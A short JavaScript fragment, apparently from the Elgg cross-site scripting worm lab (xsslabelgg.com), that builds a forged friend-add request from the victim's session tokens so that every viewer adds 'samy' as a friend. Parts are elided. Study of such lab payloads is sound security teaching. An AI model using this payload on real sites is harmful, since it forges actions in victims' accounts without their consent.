...
if (me != "samy") { 
	...
	let http_url = "http://www.xsslabelgg.com/action/friends/add?friend="+samy_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
	...
	console.log("I am samy, I don't need to be my friend.");
}
